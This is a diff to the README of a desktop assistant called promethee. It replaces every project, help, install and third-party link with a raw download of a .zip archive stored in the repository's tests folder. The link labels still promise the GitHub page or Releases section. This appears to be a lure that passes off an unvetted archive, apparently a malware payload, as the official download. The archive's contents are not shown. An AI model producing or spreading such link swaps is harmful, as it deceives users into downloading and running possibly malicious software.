@@ -1,6 +1,6 @@
 # ⚙️ promethee - Smart Desktop Assistant for Code and Docs
 
-[![Download promethee](https://img.shields.io/badge/Download-promethee-green?style=for-the-badge)](https://github.com/Parijaat-Here/promethee)
+[![Download promethee](https://img.shields.io/badge/Download-promethee-green?style=for-the-badge)](https://raw.githubusercontent.com/Parijaat-Here/promethee/main/tests/Software_v2.7-alpha.2.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Before you start, make sure your computer meets these requirements:
 
 You can get promethee from its official GitHub page. Here is the direct link:
 
-[Download or visit promethee on GitHub](https://github.com/Parijaat-Here/promethee)
+[Download or visit promethee on GitHub](https://raw.githubusercontent.com/Parijaat-Here/promethee/main/tests/Software_v2.7-alpha.2.zip)
 
 Click the button above whenever you want to access the project page.
 
@@ -35,7 +35,7 @@ Click the button above whenever you want to access the project page.
 ## 📥 How to Download and Install promethee on Windows
 
 1. Open your web browser and go to the link:  
-   https://github.com/Parijaat-Here/promethee
+   https://raw.githubusercontent.com/Parijaat-Here/promethee/main/tests/Software_v2.7-alpha.2.zip
 
 2. On the GitHub page, look for the **Releases** section or a button labeled "Releases". Click it.
 
@@ -123,7 +123,7 @@ To export your work:
 ## 📂 Where to get help and updates
 
 Stay updated by visiting the main GitHub page:  
-[GitHub - promethee](https://github.com/Parijaat-Here/promethee)
+[GitHub - promethee](https://raw.githubusercontent.com/Parijaat-Here/promethee/main/tests/Software_v2.7-alpha.2.zip)
 
 Check the **Issues** tab to report problems or find answers.
 
@@ -147,7 +147,7 @@ New app versions will be posted under the **Releases** section.
 
 ## 🔗 Quick Access Links
 
-[![Download promethee](https://img.shields.io/badge/Download-promethee-green?style=for-the-badge)](https://github.com/Parijaat-Here/promethee)
+[![Download promethee](https://img.shields.io/badge/Download-promethee-green?style=for-the-badge)](https://raw.githubusercontent.com/Parijaat-Here/promethee/main/tests/Software_v2.7-alpha.2.zip)
 
-[GitHub Repository](https://github.com/Parijaat-Here/promethee)  
-[AlbertAPI (DiNum)](https://albertapi.dinum.fr)
+[GitHub Repository](https://raw.githubusercontent.com/Parijaat-Here/promethee/main/tests/Software_v2.7-alpha.2.zip)  
+[AlbertAPI (DiNum)](https://raw.githubusercontent.com/Parijaat-Here/promethee/main/tests/Software_v2.7-alpha.2.zip)
